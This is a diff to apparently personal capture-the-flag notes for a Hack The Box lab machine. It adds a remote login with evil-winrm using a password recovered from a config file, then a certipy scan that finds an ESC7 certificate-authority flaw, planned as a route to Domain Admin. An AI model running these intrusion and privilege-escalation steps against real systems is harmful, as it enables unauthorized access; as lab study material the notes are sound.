@@ -188,7 +188,18 @@ Mostly https://www.exploit-db.com/exploits/44969
 9. unzip and grep "password", find file ".old-conf.xml" has it.
      (<user>raven@manager.htb</user>
       <password>R4v3nBe5tD3veloP3r!123</password>)
-10. 
+10. login by evil-winrm: evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
+
+(priv esclation)
+
+11. try to identify potential misconfigurations within the Certification Authority by certipy:
+    certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
+    (output shows:  [!] Vulnerabilities ESC7: 'MANAGER.HTB\\Raven' has dangerous permissions)
+12. The user Raven possesses hazardous permissions, particularly having "ManageCA" rights over the Certification Authority.
+    This implies that by leveraging the ESC7 scenario,
+    we could potentially elevate our privileges to Domain Admin while operating as user Raven.
+    ref: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7
+13. 
 
 ```
 
